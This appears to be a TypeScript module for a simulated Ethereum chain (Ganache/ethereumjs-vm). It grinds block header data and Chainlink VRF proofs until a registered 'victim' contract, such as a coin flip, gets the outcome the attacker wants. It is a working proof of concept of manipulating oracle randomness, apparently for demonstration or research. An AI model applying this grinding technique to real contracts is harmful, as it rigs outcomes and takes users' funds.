/* eslint-disable no-param-reassign, no-await-in-loop, no-constant-condition */

import VM from 'ethereumjs-vm'
import Block from 'ethereumjs-block'
import GanacheGethApiDouble from 'ganache-core/lib/subproviders/geth_api_double'
import { BigNumber, utils } from 'ethers'
import { IChainlink } from '../chainlink'
import {
  RandomnessRequestLogData,
  VictimKind,
  Victim,
  ResultChecker,
} from './type'
import Flipcoin from './flipcoin'
import {
  hexToBuffer,
  bufferToHex,
  decodeData,
  encodeCalldata,
  genTxOptsFromRandom,
  copyVm,
  Log,
} from '../../util/ethereum'
import { FN_SIG_FULFILL_RANDOMNESS_REQUEST } from '../../util/constant'
import logger from '../../util/logger'

class RandomnessHacker {
  static decodeLogData(data: string): RandomnessRequestLogData {
    const [keyHash, preSeed, senderAddress, fee, requestId] = decodeData(
      ['bytes32', 'uint256', 'address', 'uint256', 'bytes32'],
      data,
    )
    return {
      keyHash,
      preSeed: utils.hexZeroPad(preSeed, 32),
      senderAddress,
      fee,
      requestId,
    }
  }

  static async fulfillRandomness(victimBlock: Block, vm: VM, proof: string) {
    const nextHeader = new Block.Header()
    nextHeader.number = hexToBuffer(
      BigNumber.from(victimBlock.header.number).add(1).toHexString(),
    )

    const { getBlock } = vm.blockchain
    vm.blockchain.getBlock = (number, done) => {
      if (
        // @ts-ignore
        number.toNumber() ===
        BigNumber.from(victimBlock.header.number).toNumber()
      ) {
        done(undefined, victimBlock)
        return
      }
      getBlock(number, (...args) => {
        done(...args)
      })
    }
    await vm.runTx(
      await genTxOptsFromRandom(
        encodeCalldata(FN_SIG_FULFILL_RANDOMNESS_REQUEST, ['bytes'], [proof]),
        IChainlink.ADDRESS_VRF_COORDINATOR,
        vm.opts.common,
        new Block([nextHeader, [], []]),
      ),
    )
  }

  private chainlink: IChainlink

  private victims: Record<string, Victim>

  private resultCheckers: Record<VictimKind, ResultChecker>

  constructor(chainlink: IChainlink) {
    this.chainlink = chainlink
    this.victims = {}
    this.resultCheckers = {
      flipcoin: new Flipcoin(),
    }

    GanacheGethApiDouble.prototype.chainlink_addVictim = (
      optionStr: string,
      callback,
    ) => {
      const victim: Victim = JSON.parse(optionStr)
      this.victims[victim.address] = victim
      callback(null, true)
    }
  }

  async hack(vm: VM, header, randomnessRequestLog: Log) {
    const { address, data } = randomnessRequestLog
    if (address !== IChainlink.ADDRESS_VRF_COORDINATOR) {
      return
    }

    const logData = RandomnessHacker.decodeLogData(data)
    if (logData.keyHash !== this.chainlink.keyHash()) {
      return
    }

    const victim = this.victims[logData.senderAddress]
    if (!victim) {
      return
    }

    logger.info(
      `start to hack victim, address: ${victim.address}, kind: ${victim.kind}`,
    )
    let attempCount = 0
    while (true) {
      attempCount += 1
      header.extraData = Buffer.from(utils.randomBytes(32))
      logger.info(`try hash: ${bufferToHex(header.hash())}`)

      const { packedForContractInput: proof } = this.chainlink.generateProof(
        logData.preSeed,
        header.hash().toString('hex'),
        BigNumber.from(header.number).toNumber(),
      )

      const futureVm = copyVm(vm)
      await RandomnessHacker.fulfillRandomness(
        new Block([header, [], []]),
        futureVm,
        proof,
      )

      if (
        await this.resultCheckers[victim.kind].checkResult(
          copyVm(vm),
          futureVm,
          victim,
          logData,
        )
      ) {
        break
      }
    }

    logger.info(
      `successfully hacked with ${attempCount} attemp, hash: ${bufferToHex(
        header.hash(),
      )}`,
    )
  }
}

export default RandomnessHacker
